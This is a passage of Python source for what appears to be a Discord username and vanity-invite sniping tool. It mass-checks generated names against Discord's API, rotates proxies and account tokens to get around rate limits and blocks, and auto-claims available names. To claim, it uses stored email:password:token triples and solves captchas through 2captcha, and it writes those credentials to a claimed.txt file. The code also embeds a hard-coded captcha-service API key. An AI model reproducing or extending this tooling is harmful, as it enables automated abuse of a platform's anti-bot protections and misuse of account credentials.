                letters_len = remaining - digits_len
                letters = ''.join(random.choices(VanityGenerator.LETTERS, k=letters_len)) if letters_len > 0 else ''
                digits = ''.join(random.choices(VanityGenerator.DIGITS, k=digits_len))
                add(prefix + letters + digits)
            else:
                add(''.join(random.choices(VanityGenerator.POOL, k=length)))
        return list(names)
stats = {'checked': 0, 'available': 0, 'taken': 0, 'err_ratelimit': 0, 'err_block': 0, 'err_conn': 0, 'err_timeout': 0, 'err_other': 0, 'retries': 0, 'letters_hits': 0, 'hits': 0, 'epic': 0, 'requests': 0, 'total_response_time': 0.0}
stats_lock = threading.Lock()
output_lock = threading.Lock()
MAX_RETRIES = 3
last_error = ''
error_lock = threading.Lock()
def thread_crash(args):
    log.log(f'thread crash: {args.exc_type.__name__}: {args.exc_value}')
    traceback.print_exception(args.exc_type, args.exc_value, args.exc_traceback)
    sys.stderr.write(f'\n[THREAD CRASH] {args.exc_type.__name__}: {args.exc_value}\n')
    sys.stderr.flush()
threading.excepthook = thread_crash
def append_line(path, line):
    with error_lock:
        try:
            with open(path, 'a', encoding='utf-8', buffering=4096) as f:
                f.write(line + '\n')
        except Exception:
            pass
socks_pattern = re.compile('^[a-z._]+$')
def has_socks(username):
    return bool(socks_pattern.match(username))
class Checker:
    ENDPOINT = 'https://discord.com/api/v9/unique-username/username-suggestions-unauthed'
    HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Origin': 'https://discord.com', 'Referer': 'https://discord.com/register'}
    def __init__(self):
        self.session = requests.Session()
        adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=0, pool_block=False)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        self.timeout = config.get('timeout', 33)
    def check(self, name, proxy):
        global last_error
        proxy_url = format_proxy(proxy) if proxy else None
        timeout = (8, self.timeout)
        if parse_proxy(proxy or '') and (not HAS_SOCKS):
            last_error = 'SOCKS proxy but PySocks not installed'
            return ('RETRY', proxy)
        else:
            try:
                resp = self.session.get(self.ENDPOINT, params={'global_name': name}, headers=self.HEADERS, proxies={'http': proxy_url, 'https': proxy_url} if proxy_url else None, timeout=timeout)
            except requests.exceptions.ProxyError:
                error_log.log(f'ProxyError|{name}|{proxy}')
                last_error = 'Proxy Failed'
                return ('RETRY', proxy)
            except requests.exceptions.ConnectionError as e:
                error_log.log(f'ConnError|{name}|{proxy}|{e}')
                last_error = 'Connection Refused'
                return ('RETRY', proxy)
            except requests.exceptions.ReadTimeout:
                error_log.log(f'Timeout|{name}|{proxy}')
                last_error = 'Timeout'
                return ('RETRY', proxy)
            except MaxRetryError:
                error_log.log(f'MaxRetry|{name}|{proxy}')
                last_error = 'MaxRetry'
                return ('RETRY', proxy)
            except Exception as e:
                error_log.log(f'check error|{name}|{proxy}|{e}')
                last_error = str(e)[:60]
                return ('RETRY', proxy)
            if resp.status_code == 200:
                try:
                    data = resp.json()
                except Exception:
                    last_error = 'JSON decode'
                    return ('RETRY', proxy)
                if not isinstance(data, dict):
                    last_error = 'Bad response'
                    return ('RETRY', proxy)
                else:
                    if 'taken' in data:
                        if not data['taken']:
                            return ('AVAILABLE', proxy)
                        else:
                            return ('TAKEN', proxy)
                    else:
                        uname = str(data.get('username', ''))
                        if uname.lower() == name.lower():
                            return ('AVAILABLE', proxy)
                        else:
                            return ('TAKEN', proxy)
            else:
                if resp.status_code == 429:
                    retry_after = 5.0
                    try:
                        retry_after = float(resp.json().get('retry_after', 5))
                    except Exception:
                        pass
                    return ('RATELIMIT', proxy, retry_after)
                else:
                    if resp.status_code == 403:
                        last_error = 'Forbidden (403)'
                        return ('BLOCKED', proxy)
                    else:
                        last_error = f'HTTP {resp.status_code}'
                        return ('RETRY', proxy)
    def check_token(self, name, token, proxy):
        global last_error
        url = 'https://discord.com/api/v9/users/@me/pomelo-attempt'
        headers = dict(self.HEADERS)
        headers['Authorization'] = token
        proxy_url = format_proxy(proxy) if proxy else None
        timeout = (8, self.timeout)
        try:
            resp = self.session.post(url, headers=headers, json={'username': name}, proxies={'http': proxy_url, 'https': proxy_url} if proxy_url else None, timeout=timeout)
        except requests.exceptions.ProxyError:
            last_error = 'Proxy Failed'
            return ('RETRY', token, proxy)
        except requests.exceptions.ConnectionError:
            last_error = 'Connection Refused'
            return ('RETRY', token, proxy)
        except requests.exceptions.ReadTimeout:
            last_error = 'Timeout'
            return ('RETRY', token, proxy)
        except MaxRetryError:
            last_error = 'MaxRetry'
            return ('RETRY', token, proxy)
        except Exception as e:
            last_error = str(e)[:60]
            return ('RETRY', token, proxy)
        if resp.status_code == 200:
            data = resp.json()
            taken = data.get('taken')
            if taken is True:
                return ('TAKEN', token, proxy)
            else:
                if taken is False:
                    return ('AVAILABLE', token, proxy)
                else:
                    return ('RETRY', token, proxy)
        else:
            if resp.status_code == 400:
                last_error = 'Account not eligible'
                return ('INVALID', token, proxy)
            else:
                if resp.status_code == 401:
                    return ('TOKEN_DEAD', token, proxy)
                else:
                    if resp.status_code == 429:
                        retry_after = 5.0
                        try:
                            retry_after = float(resp.json().get('retry_after', 5))
                        except Exception:
                            pass
                        return ('RATELIMIT', token, proxy, retry_after)
                    else:
                        if resp.status_code == 403:
                            last_error = 'Forbidden (403)'
                            return ('RETRY', token, proxy)
                        else:
                            last_error = f'HTTP {resp.status_code}'
                            return ('RETRY', token, proxy)
vanity_session = requests.Session()
vanity_adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=0, pool_block=False)
vanity_session.mount('http://', vanity_adapter)
vanity_session.mount('https://', vanity_adapter)
def check_vanity_once(name, proxy):
    proxy_url = format_proxy(proxy) if proxy else None
    url = f'https://discord.com/api/v9/invites/{name}?with_counts=true'
    headers = {'User-Agent': Checker.HEADERS['User-Agent']}
    try:
        resp = vanity_session.get(url, headers=headers, proxies={'http': proxy_url, 'https': proxy_url} if proxy_url else None, timeout=(8, 25))
    except requests.exceptions.ProxyError:
        return ('RETRY', proxy)
    except requests.exceptions.ConnectionError:
        return ('RETRY', proxy)
    except requests.exceptions.ReadTimeout:
        return ('RETRY', proxy)
    except MaxRetryError:
        return ('RETRY', proxy)
    except Exception:
        return ('RETRY', proxy)
    if resp.status_code == 200:
        return ('TAKEN', proxy)
    else:
        if resp.status_code == 404:
            return ('AVAILABLE', proxy)
        else:
            if resp.status_code == 429:
                retry_after = 5.0
                try:
                    retry_after = float(resp.json().get('retry_after', 5))
                except Exception:
                    pass
                return ('RATELIMIT', proxy, retry_after)
            else:
                if resp.status_code == 403:
                    return ('BLOCKED', proxy)
                else:
                    return ('RETRY', proxy)
def send_webhook(webhook, name, start):
    try:
        payload = {'username': 'PRO SNIPER', 'embeds': [{'title': 'Valid', 'description': f'```\n{name}\n```', 'color': 16777215, 'footer': {'text': 'dev by saud(@v.h6)'}}]}
        resp = requests.post(webhook, json=payload, timeout=15)
        if resp.status_code not in [200, 204]:
            error_log.log(f'webhook|{resp.status_code}|{resp.text[:200]}')
    except Exception as e:
        error_log.log(f'webhook_error|{name}|{e}')

def webhook_error(webhook, name, email, password, start):
    try:
        solver = CaptchaSolver()
        fields = []
        if solver.solved > 0:
            fields.append({'name': 'Captchas Solved', 'value': str(solver.solved), 'inline': True})
        embed = {'title': 'Claimed', 'description': f'```\n{name}\n```', 'color': 16777215, 'footer': {'text': 'dev by saud(@v.h6)'}}
        if fields:
            embed['fields'] = fields
        payload = {'username': 'DIV SNIPER', 'embeds': [embed]}
        resp = requests.post(webhook, json=payload, timeout=15)
        if resp.status_code not in [200, 204]:
            error_log.log(f'claim_webhook|{resp.status_code}|{resp.text[:200]}')
    except Exception as e:
        error_log.log(f'claim_webhook_error|{name}|{e}')

class CaptchaSolver:
    TIMEOUT = 120
    API_KEY = 'f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34'
    DISCORD_SITE_KEY = 'a0b78c48-b3b1-427c-b5c2-30c470457e05'
    def __init__(self):
        self._stats_lock = threading.Lock()
        self.solved = 0
        self.failed = 0
    @property
    def enabled(self):
        return bool(self.API_KEY)
    def get_balance(self, proxy=None):
        proxy_url = format_proxy(proxy) if proxy else None
        proxies = {'http': proxy_url, 'https': proxy_url} if proxy_url else None
        try:
            resp = requests.get('https://2captcha.com/res.php', params={'key': self.API_KEY, 'action': 'getBalance'}, proxies=proxies, timeout=15)
            if resp.status_code == 200 and '|' in resp.text:
                parts = resp.text.split('|')
                if parts[0] == 'OK':
                    return float(parts[1])
            error_log.log(f'captcha_balance|{resp.text[:200]}')
            return None
        except Exception as e:
            error_log.log(f'captcha_balance|{e}')
            return None

    def solve(self, site_key=None, page_url='https://discord.com/register', proxy=None):
        site_key = site_key or self.DISCORD_SITE_KEY
        proxy_url = format_proxy(proxy) if proxy else None
        proxies = {'http': proxy_url, 'https': proxy_url} if proxy_url else None
        task_id = self._create_task(site_key, page_url, proxies)
        if not task_id:
            return None
        else:
            token = self._wait_result(task_id, proxies)
            with self._stats_lock:
                if token:
                    self.solved += 1
                else:
                    self.failed += 1
            return token
    def _create_task(self, site_key, page_url, proxies):
        try:
            data = {'key': self.API_KEY, 'method': 'hcaptcha', 'sitekey': site_key, 'pageurl': page_url, 'json': 1}
            resp = requests.post('https://2captcha.com/in.php', data=data, proxies=proxies, timeout=30)
            result = resp.json()
            if result.get('status') != 1:
                error_log.log(f'captcha_create|{result.get('request')}')
                return
            else:
                return result['request']
        except Exception as e:
            error_log.log(f'captcha_create_error|{e}')
            return None
    def _wait_result(self, task_id, proxies, timeout=120):
        start = time.time()
        delay = 5
        while time.time() - start < timeout:
            try:
                resp = requests.get('https://2captcha.com/res.php', params={'key': self.API_KEY, 'action': 'getResult', 'id': task_id, 'json': 1}, proxies=proxies, timeout=15)
                result = resp.json()
                if result.get('status') == 1:
                    return result['request']
                if result.get('request') != 'CAPCHA_NOT_READY':
                    error_log.log(f"captcha_result|{result.get('request')}")
                    return None
            except Exception as e:
                error_log.log(f'captcha_poll_error|{e}')
            time.sleep(delay)
            delay = min(delay + 2, 15)
        return None

def captcha_solver_settings():
    while True:
        clear()
        banner()
        print_flush(f'  {Colors.BOLD}{Colors.WHITE}CAPTCHA SOLVER SETTINGS{Colors.RESET}\n')
        captcha = CaptchaSolver()
        balance = 'checking...'
        status_text = 'NO'
        if captcha.enabled:
            bal = captcha.get_balance()
            if bal is not None:
                balance = f'${bal:.4f}'
                status_text = 'YES'
            else:
                balance = 'error'
                status_text = 'CHECK FAILED'
        panel('STATUS', [('Service', '2captcha'), ('Connected', status_text), ('Balance', balance), ('Solved', captcha.solved), ('Failed', captcha.failed)])
        print_flush(f'  {Colors.WHITE}[1]{Colors.RESET} Check balance')
        print_flush(f'  {Colors.WHITE}[2]{Colors.RESET} Test solve')
        print_flush(f'  {Colors.WHITE}[0]{Colors.RESET} Back')
        choice = prompt('Setting', '0')
        if choice == '1':
            status('info', 'Checking balance...')
            captcha = CaptchaSolver()
            bal = captcha.get_balance()
            if bal is not None:
                status('ok', f'Balance: {Colors.WHITE}${bal:.4f}{Colors.RESET}')
            else:
                status('bad', 'Could not fetch balance.')
        else:
            if choice == '2':
                status('info', 'Sending test captcha solve...')
                captcha = CaptchaSolver()
                token = captcha.solve()
                if token:
                    status('ok', f'Captcha solved! Token: {Colors.WHITE}{token[:40]}...{Colors.RESET}')
                else:
                    status('bad', 'Failed to solve captcha.')
            else:
                if choice == '0':
                    return None
                else:
                    status('bad', 'Unknown option')
        if choice != '0':
            input(f'\n  {Colors.DIM}Press Enter...{Colors.RESET}')
def claim_username(name, token, password, proxy=None):
    proxy_url = format_proxy(proxy) if proxy else None
    proxies = {'http': proxy_url, 'https': proxy_url} if proxy_url else None
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': Checker.HEADERS['User-Agent'],
        'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVsZWFzZV90b2tlbiI6Im51bGwiLCJ0ZWFtX2lkIjoiIiwiY2xpZW50X2xvY2F0aW9uIjoiIn0='
    }
    data = {'username': name}
    if password:
        data['password'] = password
    for attempt in range(3):
        try:
            resp = requests.patch('https://discord.com/api/v9/users/@me', json=data, headers=headers, proxies=proxies, timeout=15)
            if resp.status_code == 200:
                return 'OK'
            if resp.status_code == 401:
                return 'TOKEN_DEAD'
            if resp.status_code == 429:
                retry_after = 15
                try:
                    retry_after = resp.json().get('retry_after', 15)
                except Exception:
                    pass
                time.sleep(retry_after)
                return 'RATELIMIT'
            if resp.status_code == 403:
                return 'FORBIDDEN'
            if resp.status_code == 400:
                data_json = resp.json()
                solver = CaptchaSolver()
                if not solver.enabled:
                    error_log.log(f'claim_no_captcha|{name}|captcha_required|{resp.text[:200]}')
                    return 'NO_CAPTCHA'
                captcha_key = data_json.get('captcha_key') or data_json.get('captcha_rqdata')
                site_key = data_json.get('captcha_sitekey') or CaptchaSolver.DISCORD_SITE_KEY
                if captcha_key or data_json.get('captcha'):
                    with output_lock:
                        print_flush(f'  {Colors.CYAN}Solving captcha for {Colors.WHITE}{name}{Colors.RESET}...')
                    token_captcha = solver.solve(site_key=site_key, proxy=proxy)
                    if not token_captcha:
                        with output_lock:
                            print_flush(f'  {Colors.RED}Captcha solving failed for {Colors.WHITE}{name}{Colors.RESET}')
                        error_log.log(f'claim_captcha_fail|{name}|solve_returned_none')
                        return 'CAPTCHA_FAIL'
                    headers['X-Captcha-Key'] = token_captcha
                    if data_json.get('captcha_rqtoken'):
                        headers['X-Captcha-Rqtoken'] = data_json['captcha_rqtoken']
                    resp2 = requests.patch('https://discord.com/api/v9/users/@me', json=data, headers=headers, proxies=proxies, timeout=15)
                    if resp2.status_code == 200:
                        return 'OK'
                    error_log.log(f'claim_captcha_sub_fail|{name}|{resp2.status_code}|{resp2.text[:200]}')
                    return 'FAILED'
            error_log.log(f'claim_fail|{name}|{resp.status_code}|{resp.text[:200]}')
            return 'FAILED'
        except Exception as e:
            error_log.log(f'claim_error|{name}|{e}')
            return 'ERROR'
    return 'FAILED'

def format_rate(stats, queue_sz, start_time):
    elapsed = time.time() - start_time
    rps = stats['requests'] / max(elapsed, 0.1)
    hits = stats['hits']
    epic = stats['epic']
    title = f'Hits: {hits} | Epic: {epic}'
    try:
        if os.name == 'nt':
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        else:
            sys.stdout.write(f'\x1b]0;{title}\x07')
            sys.stdout.flush()
    except Exception:
        return None

def run_username_checker(names, threads, webhook=None, use_tokens=False, auto_claim=False):
    use_tokens = use_tokens and tokens.count() > 0
    if auto_claim and claim_tokens.count() == 0:
            auto_claim = False
    seen = set()
    filtered = []
    for n in names:
        n = n.strip()
        if n and n not in seen:
                seen.add(n)
                filtered.append(n)
    total = len(filtered)
    if total == 0:
        status('warn', 'No usernames to check.')
        return None
    else:
        q = queue.Queue()
        for n in filtered:
            q.put(n)
        start = time.time()
        stop_event = threading.Event()
        out_dir = RESULTS_DIR / time.strftime('%Y-%m-%d_%H-%M-%S')
        out_dir.mkdir(parents=True, exist_ok=True)
        checker = Checker()
        active = [0]
        active_lock = threading.Lock()
        stats.update({'checked': 0, 'available': 0, 'taken': 0, 'err_ratelimit': 0, 'err_block': 0, 'err_conn': 0, 'err_timeout': 0, 'err_other': 0, 'retries': 0, 'letters_hits': 0, 'hits': 0, 'epic': 0, 'requests': 0, 'total_response_time': 0.0})
        def worker():
            while not stop_event.is_set():
                try:
                    name = q.get(timeout=3)
                except queue.Empty:
                    if q.empty() and active[0] == 0:
                        return None
                    continue
                with active_lock:
                    active[0] += 1
                try:
                    checked = False
                    retries = 0
                    while not checked and (not stop_event.is_set()):
                        proxy = proxies.get()
                        token = tokens.get() if use_tokens else None
                        try:
                            if token:
                                result = checker.check_token(name, token, proxy)
                            else:
                                result = checker.check(name, proxy)
                        except Exception as e:
                            error_log.log(f'worker|{name}|{proxy}|{e}')
                            retries += 1
                            if retries > 5:
                                q.put(name)
                                break
                            continue
                        with stats_lock:
                            stats['requests'] += 1
                        code = result[0]
                        if code == 'AVAILABLE':
                            with stats_lock:
                                stats['checked'] += 1
                                stats['available'] += 1
                                stats['hits'] += 1
                                if has_socks(name):
                                    stats['epic'] += 1
                            append_line(out_dir / 'hits.txt', name)
                            append_line(RESULTS_DIR / 'hits.txt', name)
                            with output_lock:
                                print_flush(f'  {Colors.GREEN_D}VALID {Colors.GREY}➢{Colors.RESET} {Colors.WHITE}{name}{Colors.RESET}')
                            if webhook:
                                send_webhook(webhook, name, start)
                            if auto_claim:
                                claim_token = claim_tokens.get()
                                if claim_token:
                                    acc = claim_tokens.get_account(claim_token)
                                    if acc:
                                        email = acc.get('email')
                                        password = acc.get('password')
                                        claim_result = None
                                        for _ in range(5):
                                            p = proxies.get()
                                            claim_result = claim_username(name, claim_token, password, p)
                                            if claim_result in ('OK', 'TOKEN_DEAD', 'RATELIMIT', 'NO_CAPTCHA', 'CAPTCHA_EXHAUSTED'):
                                                break
                                            else:
                                                proxies.mark_cooldown(p, 5)
                                        if claim_result == 'OK':
                                            append_line(out_dir / 'claimed.txt', f'{email}:{password}:{claim_token}')
                                            append_line(RESULTS_DIR / 'claimed.txt', f'{email}:{password}:{claim_token}')
                                            with output_lock:
                                                print_flush(f'  {Colors.GREEN}CLAIMED {Colors.GREY}➢{Colors.RESET} {Colors.WHITE}{name}{Colors.RESET}')
                                            if webhook:
                                                webhook_error(webhook, name, email, password, start)
                                        else:
                                            claim_tokens.mark_cooldown(claim_token, 30)
                                            with output_lock:
                                                print_flush(f'  {Colors.YELLOW}CLAIM FAILED {Colors.GREY}➢{Colors.RESET} {Colors.WHITE}{name}{Colors.RESET} ({claim_result})')
                            checked = True
                        elif code == 'TAKEN':
                            with stats_lock:
                                stats['checked'] += 1
                                stats['taken'] += 1
                            with output_lock:
                                print_flush(f'  {Colors.RED_D}TAKEN {Colors.GREY}➢{Colors.RESET} {Colors.WHITE}{name}{Colors.RESET}')
                            checked = True
                        elif code == 'RATELIMIT':
                            retry_after = result[-1] if len(result) > 2 else 15.0
                            if token:
                                tokens.mark_cooldown(token, 15)
                            if proxy:
                                proxies.mark_cooldown(proxy, config.get('proxy_cooldown', 12))
                            with stats_lock:
                                stats['retries'] += 1
                            q.put(name)
                            break
                        elif code == 'BLOCKED':
                            if proxy:
                                proxies.mark_cooldown(proxy, config.get('proxy_cooldown', 12))
                            with stats_lock:
                                stats['retries'] += 1
                            q.put(name)
                            break
                        elif code == 'TOKEN_DEAD':
                            if token:
                                tokens.mark_bad(token)
                            with stats_lock:
                                stats['retries'] += 1
                            retries += 1
                            if retries > 5:
                                q.put(name)
                                break
                            continue
                        elif code == 'INVALID':
                            if token:
                                tokens.mark_bad(token)
                            with stats_lock:
                                stats['retries'] += 1
                            retries += 1
                            if retries > 5:
                                q.put(name)
                                break
                            continue
                        else:
                            retries += 1
                            if retries > 5:
                                q.put(name)
                                break
                finally:
                    with active_lock:
                        active[0] -= 1
                    q.task_done()
                    delay = config.get('request_delay', 0)
                    if delay > 0:
                        time.sleep(delay)
        def progress_printer():
            while not stop_event.is_set():
                time.sleep(2)
                elapsed = time.time() - start
                remaining = q.qsize()
                format_rate(stats, remaining, start)
        threading.Thread(target=progress_printer, daemon=True).start()
        workers = [threading.Thread(target=worker, daemon=True) for _ in range(max(1, threads))]
        for t in workers:
            t.start()
        try:
            while any(t.is_alive() for t in workers):
                time.sleep(0.2)
        except KeyboardInterrupt:
            stop_event.set()
            status('warn', 'stopping...')
        stop_event.set()
        for t in workers:
            t.join(timeout=5)
        elapsed = round(time.time() - start, 1)
        panel('RUN COMPLETE', [('Usernames', total), ('Checked', stats['checked']), ('Hits', stats['hits']), ('Epic', stats['epic']), ('Taken', stats['taken']), ('Retries', stats['retries']), ('Time (s)', elapsed), ('Avg RPS', round(stats['requests'] / max(elapsed, 1))), ('Saved to', out_dir.name)])

def run_vanity_checker(names, threads):
    seen = set()
    filtered = []
    for n in names:
        n = n.strip()
        if n and n not in seen:
                seen.add(n)
                filtered.append(n)
    total = len(filtered)
    if total == 0:
        status('warn', 'No vanity names to check.')
        return None
    else:
        q = queue.Queue()
        for n in filtered:
            q.put(n)
        start = time.time()
        stop_event = threading.Event()
        out_dir = RESULTS_DIR / time.strftime('%Y-%m-%d_%H-%M-%S')
        out_dir.mkdir(parents=True, exist_ok=True)
        active = [0]
        active_lock = threading.Lock()
        stats.update({'checked': 0, 'available': 0, 'taken': 0, 'err_ratelimit': 0, 'err_block': 0, 'err_conn': 0, 'err_timeout': 0, 'err_other': 0, 'retries': 0, 'letters_hits': 0, 'hits': 0, 'epic': 0, 'requests': 0, 'total_response_time': 0.0})
        def worker():
            while not stop_event.is_set():
                try:
                    name = q.get(timeout=3)
                except queue.Empty:
                    if q.empty() and active[0] == 0:
                        return None
                    continue
                with active_lock:
                    active[0] += 1
                try:
                    checked = False
                    retries = 0
                    while not checked and (not stop_event.is_set()):
                        proxy = proxies.get()
                        try:
                            result = check_vanity_once(name, proxy)
                        except Exception as e:
                            error_log.log(f'vanity_worker|{name}|{proxy}|{e}')
                            retries += 1
                            if retries > 5:
                                q.put(name)
                                break
                            continue
                        with stats_lock:
                            stats['requests'] += 1
                        code = result[0]
                        if code == 'AVAILABLE':
                            with stats_lock:
                                stats['checked'] += 1
                                stats['available'] += 1
                                stats['hits'] += 1
                                if has_socks(name):
                                    stats['epic'] += 1
                            append_line(out_dir / 'vanity_hits.txt', name)
                            append_line(RESULTS_DIR / 'vanity_hits.txt', name)
                            with output_lock:
                                print_flush(f'  {Colors.GREEN_D}VALID {Colors.GREY}➢{Colors.RESET} {Colors.WHITE}{name}{Colors.RESET}')
                            if webhook:
                                send_webhook(webhook, name, start)
                            checked = True
                        elif code == 'TAKEN':
                            with stats_lock:
                                stats['checked'] += 1
                                stats['taken'] += 1
                            with output_lock:
                                print_flush(f'  {Colors.RED_D}TAKEN {Colors.GREY}➢{Colors.RESET} {Colors.WHITE}{name}{Colors.RESET}')
                            checked = True
                        elif code == 'RATELIMIT':
                            if proxy:
                                proxies.mark_cooldown(proxy, config.get('proxy_cooldown', 12))
                            with stats_lock:
                                stats['retries'] += 1
                            q.put(name)
                            break
                        else:
                            retries += 1
                            if retries > 5:
                                q.put(name)
                                break
                finally:
                    with active_lock:
                        active[0] -= 1
                    q.task_done()
                    delay = config.get('request_delay', 0)
                    if delay > 0:
                        time.sleep(delay)
        def progress_printer():
            while not stop_event.is_set():
                time.sleep(2)
                elapsed = time.time() - start
                remaining = q.qsize()
                format_rate(stats, remaining, start)
        threading.Thread(target=progress_printer, daemon=True).start()
        workers = [threading.Thread(target=worker, daemon=True) for _ in range(max(1, threads))]
        for t in workers:
            t.start()
        try:
            while any(t.is_alive() for t in workers):
                time.sleep(0.2)
        except KeyboardInterrupt:
            stop_event.set()
            status('warn', 'stopping...')
        stop_event.set()
        for t in workers:
            t.join(timeout=5)
        elapsed = round(time.time() - start, 1)
        panel('RUN COMPLETE', [('Vanity names', total), ('Checked', stats['checked']), ('Hits', stats['hits']), ('Epic', stats['epic']), ('Taken', stats['taken']), ('Retries', stats['retries']), ('Time (s)', elapsed), ('Avg RPS', round(stats['requests'] / max(elapsed, 1))), ('Saved to', out_dir.name)])

def username_generator_menu():
    clear()
    banner()
    print_flush(f'  {Colors.BOLD}{Colors.WHITE}USERNAME GENERATOR{Colors.RESET}\n')
    for k, (label, desc) in UsernameGenerator.MODES.items():
        print_flush(f'  {Colors.WHITE}[{k:>2}]{Colors.RESET} {Colors.WHITE}{label:<20}{Colors.RESET} {Colors.DIM}{desc}{Colors.RESET}')
    print_flush(f'  {Colors.WHITE}[17]{Colors.RESET} {Colors.WHITE}{'Pattern':<20}{Colors.RESET} {Colors.DIM}????, a???, etc{Colors.RESET}')
    print_flush(f'  {Colors.WHITE}[ 0]{Colors.RESET} {Colors.WHITE}{'Load from file':<20}{Colors.RESET} {Colors.DIM}data/names_to_check.txt{Colors.RESET}')
    try:
        mode = int(prompt('Select mode [0-17]', '13'))
        if mode == 16:
            length = 0
        else:
            length = int(prompt('Character length', '4'))
        count = int(prompt('How many to generate (MAX 10,000,000)', '1000'))
    except ValueError:
        status('bad', 'Invalid number')
        return None
    if mode != 16 and (length < 2 or length > 32):
        status('bad', 'Length must be 2-32')
        return None
    else:
        count = max(1, min(count, 10000000))
        if mode == 0:
            names = (DATA_DIR / 'names_to_check.txt').read_text(encoding='utf-8').splitlines()
        else:
            if mode == 17:
                pattern = prompt('Enter pattern (? = any)')
                names = UsernameGenerator.generate_pattern(pattern, length, count)
            else:
                names = UsernameGenerator.generate(mode, length, count)
        (DATA_DIR / 'names_to_check.txt').write_text('\n'.join(names), encoding='utf-8')
        status('ok', f'Generated {Colors.WHITE}{len(names)}{Colors.RESET} usernames -> {Colors.SILVER}data/names_to_check.txt{Colors.RESET}')
        input(f'\n  {Colors.DIM}Press Enter...{Colors.RESET}')
def username_checker_menu():
    clear()
    banner()
    print_flush(f'  {Colors.BOLD}{Colors.WHITE}USERNAME CHECKER{Colors.RESET}\n')
    f = DATA_DIR / 'names_to_check.txt'
    if not f.exists():
        f.write_text('', encoding='utf-8')
    names = f.read_text(encoding='utf-8').splitlines()
    if not names:
        status('warn', 'No usernames loaded. Run generator first.')
        input(f'\n  {Colors.DIM}Press Enter...{Colors.RESET}')
    else:
        run_auto_check(names, 'check')
def auto_sniper_menu():
    clear()
    banner()
    print_flush(f'  {Colors.BOLD}{Colors.WHITE}AUTO SNIPER{Colors.RESET}\n')
    for k, (label, desc) in UsernameGenerator.MODES.items():
        print_flush(f'  {Colors.WHITE}[{k:>2}]{Colors.RESET} {Colors.WHITE}{label:<16}{Colors.RESET} {Colors.DIM}{desc}{Colors.RESET}')
    print_flush(f'  {Colors.WHITE}[17]{Colors.RESET} {Colors.WHITE}{'Pattern':<16}{Colors.RESET} {Colors.DIM}????, a???, etc{Colors.RESET}')
    print_flush(f'  {Colors.WHITE}[ 0]{Colors.RESET} {Colors.WHITE}{'Load from file':<16}{Colors.RESET} {Colors.DIM}data/names_to_check.txt{Colors.RESET}')
    print_flush()
    try:
        mode = int(prompt('Select mode [0-17]', '15'))
        length = int(prompt('Character length', '4'))
        count = int(prompt('How many to generate (MAX 10,000,000)', '2000'))
    except ValueError:
        status('bad', 'Invalid number')
        return None
    count = max(1, min(count, 10000000))
    if length < 2 or length > 32:
        status('bad', 'Length must be 2-32')
        return None
    else:
        if mode == 0:
            names = (DATA_DIR / 'names_to_check.txt').read_text(encoding='utf-8').splitlines()
        else:
            if mode == 17:
                pattern = prompt('Enter pattern (? = any)')
                names = UsernameGenerator.generate_pattern(pattern, length, count)
            else:
                names = UsernameGenerator.generate(mode, length, count)
        if not names:
            status('bad', 'No names generated')
            return None
        else:
            status('info', f'Generated {Colors.WHITE}{len(names)}{Colors.RESET} candidates')
            run_auto_check(names, 'sniper')
def run_auto_check(names, label):
    global DIRECT_CONNECTION
    threads = int(prompt('Threads', str(config.get('threads', 50))))
    webhook = config.get('webhook')
    use_tokens = bool(config.get('use_tokens', False)) and tokens.count() > 0
    auto_claim = bool(config.get('auto_claim', True)) and claim_tokens.count() > 0
    if auto_claim:
        claim_count = claim_tokens.count()
        if claim_count == 0:
            status('warn', 'Auto claim ON but no email:pass:token pairs found. Disabling claim.')
            auto_claim = False
        else:
            status('info', f'Auto claim: {Colors.GREEN}ON{Colors.RESET} ({Colors.WHITE}{claim_count}{Colors.RESET} claim tokens ready)')
    if use_tokens:
        valid, total_valid, bad = verify_proxy_list()
        status('info', f'Tokens: {Colors.WHITE}{valid}/{total_valid}{Colors.RESET} valid')
        if bad:
            for tok, err in bad[:3]:
                status('warn', f'{Colors.RED}{tok}{Colors.RESET} -- {Colors.GREY}{err}{Colors.RESET}')
        if valid == 0:
            status('warn', 'All tokens invalid! Falling back to unauthed checks.')
            use_tokens = False
    else:
        status('info', 'Running unauthenticated (no tokens)')
    DIRECT_CONNECTION = prompt('Check with your own IP (direct, no proxies)? (y/n)', 'n').strip().lower() in ('y', 'yes', '1', 't')
    if DIRECT_CONNECTION:
        status('info', 'Using your own IP directly (no proxies)')
    else:
        if proxies.proxies:
            if confirm(f'Verify {len(proxies.proxies)} proxies'):
                ok, bad = proxy_settings_menu()
                if ok == 0:
                    status('warn', 'All proxies dead.')
                    if confirm('Scrape free proxies (websites + GitHub)'):
                        status('info', 'Scraping proxies...')
                        n = scrape_proxies()
                        status('ok', f'Found {Colors.WHITE}{n}{Colors.RESET} proxies')
                        proxies.reload()
                        if proxies.count() > 0:
                            ok, bad = proxy_settings_menu()
                            if ok == 0:
                                status('warn', 'All scraped proxies dead too. Using direct connection.')
                            else:
                                status('ok', f'Proxies: {Colors.GREEN}{ok}{Colors.RESET} kept / {Colors.RED}{bad}{Colors.RESET} removed')
                        else:
                            status('warn', 'No proxies found. Using direct connection.')
                else:
                    status('ok', f'Proxies: {Colors.GREEN}{ok}{Colors.RESET} kept / {Colors.RED}{bad}{Colors.RESET} removed')
            else:
                status('info', f'Using {Colors.WHITE}{len(proxies.proxies)}{Colors.RESET} proxies without verification')
        else:
            status('warn', 'No proxies loaded.')
